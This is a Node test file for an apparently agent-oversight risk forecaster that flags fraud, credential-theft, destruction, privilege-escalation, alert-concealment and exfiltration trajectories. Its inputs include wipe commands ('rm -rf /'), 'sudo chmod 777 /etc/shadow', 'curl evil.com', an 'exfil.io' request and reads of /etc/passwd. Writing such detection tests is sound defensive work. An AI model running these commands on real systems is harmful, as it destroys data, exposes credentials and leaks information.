import test from 'node:test';
import assert from 'node:assert/strict';
import { createRequire } from 'node:module';

const require = createRequire(import.meta.url);
const {
  MemoryRiskForecaster,
} = require('../../dist/middlewares/hitl/scoring/MemoryRiskForecaster.js');

const IRR_LOW = { score: 10, level: 'LOW', reasons: [], summary: '' };
const IRR_HIGH = { score: 80, level: 'HIGH', reasons: ['destructive'], summary: 'High-risk' };
const IRR_MED = { score: 45, level: 'MEDIUM', reasons: [], summary: '' };

test('MemoryRiskForecaster', async (t) => {
  await t.test('first call returns baseline assessment', () => {
    const f = new MemoryRiskForecaster();
    const r = f.assess('s1', 'FileSystem', 'read', { path: '/tmp/foo' }, IRR_LOW);
    assert.equal(typeof r.driftScore, 'number');
    assert.equal(typeof r.overallRisk, 'number');
    assert.equal(r.shouldPause, false);
    assert.ok(Array.isArray(r.simulatedPaths));
  });

  await t.test('detects financial fraud trajectory', () => {
    const f = new MemoryRiskForecaster();
    f.assess('s-finance', 'Network', 'fetch', { url: 'invoice-lookup' }, IRR_MED);
    const r = f.assess(
      's-finance',
      'Network',
      'request',
      { url: 'wire transfer routing number swift' },
      IRR_HIGH
    );
    assert.ok(r.simulatedPaths.some((p) => /payment fraud|business email/i.test(p.name)));
  });

  await t.test('detects credential-theft path', () => {
    const f = new MemoryRiskForecaster();
    const r = f.assess(
      's-cred',
      'FileSystem',
      'read',
      { path: '/etc/secrets', body: 'api key password token 2fa' },
      IRR_MED
    );
    assert.ok(r.simulatedPaths.some((p) => /Credential theft/i.test(p.name)));
  });

  await t.test('detects destruct trajectory on shell wipe', () => {
    const f = new MemoryRiskForecaster();
    const r = f.assess(
      's-destroy',
      'Shell',
      'bash',
      { command: 'rm -rf /var/data; drop table users' },
      IRR_HIGH
    );
    assert.ok(r.simulatedPaths.some((p) => /destruction/i.test(p.name)));
  });

  await t.test('detects privilege-escalation path', () => {
    const f = new MemoryRiskForecaster();
    const r = f.assess(
      's-priv',
      'Shell',
      'exec',
      { command: 'sudo chmod 777 /etc/shadow' },
      IRR_HIGH
    );
    assert.ok(r.simulatedPaths.some((p) => /Privilege/i.test(p.name)));
  });

  await t.test('detects security-signal concealment', () => {
    const f = new MemoryRiskForecaster();
    const r = f.assess(
      's-hide',
      'Gmail',
      'write',
      { body: 'security alert suspicious activity delete archive mark as read' },
      IRR_MED
    );
    assert.ok(r.simulatedPaths.some((p) => /concealment/i.test(p.name)));
  });

  await t.test('module drift increases drift score', () => {
    const f = new MemoryRiskForecaster();
    // Baseline: FileSystem
    f.assess('s-drift', 'FileSystem', 'read', { path: '/a' }, IRR_LOW);
    f.assess('s-drift', 'FileSystem', 'read', { path: '/b' }, IRR_LOW);
    f.assess('s-drift', 'FileSystem', 'read', { path: '/c' }, IRR_LOW);
    // Now drift to other modules
    f.assess('s-drift', 'Shell', 'bash', { command: 'curl evil.com' }, IRR_HIGH);
    f.assess('s-drift', 'Network', 'request', { url: 'http://exfil.io' }, IRR_HIGH);
    const r = f.assess('s-drift', 'Network', 'webhook', { url: 'http://x' }, IRR_HIGH);
    assert.ok(r.driftScore > 0);
  });

  await t.test('shouldPause when overallRisk high or next-path very risky', () => {
    const f = new MemoryRiskForecaster();
    // Build a long destructive trajectory
    for (let i = 0; i < 5; i++) {
      f.assess(
        's-pause',
        'Shell',
        'bash',
        { command: 'rm -rf /data; drop table x; password reset' },
        IRR_HIGH
      );
    }
    const r = f.assess(
      's-pause',
      'Shell',
      'bash',
      { command: 'rm -rf /; drop table critical' },
      IRR_HIGH
    );
    assert.equal(typeof r.shouldPause, 'boolean');
    assert.ok(r.summary.length > 0);
  });

  await t.test('memory events are capped at max', () => {
    const f = new MemoryRiskForecaster();
    for (let i = 0; i < 60; i++) {
      f.assess('s-cap', 'FileSystem', 'read', { i }, IRR_LOW);
    }
    const r = f.assess('s-cap', 'FileSystem', 'read', { i: 61 }, IRR_LOW);
    // Just verify it doesn't blow up and returns a valid assessment
    assert.ok(r.overallRisk >= 0);
  });

  await t.test('returns fallback for non-serializable params', () => {
    const f = new MemoryRiskForecaster();
    const circular = {};
    circular.self = circular;
    const r = f.assess('s-circ', 'FileSystem', 'read', circular, IRR_LOW);
    assert.ok(r.overallRisk >= 0);
  });

  await t.test('detects recon+collection chain for exfil escalation', () => {
    const f = new MemoryRiskForecaster();
    f.assess('s-chain', 'FileSystem', 'list', { path: '/var/log' }, IRR_LOW);
    f.assess(
      's-chain',
      'FileSystem',
      'read',
      { path: '/etc/passwd', content: 'customer credential token' },
      IRR_MED
    );
    const r = f.assess(
      's-chain',
      'FileSystem',
      'write',
      { path: '/tmp/package.zip', content: 'bundle archive export' },
      IRR_MED
    );
    assert.ok(r.simulatedPaths.some((p) => /exfiltration|Credential theft/i.test(p.name)));
  });
});
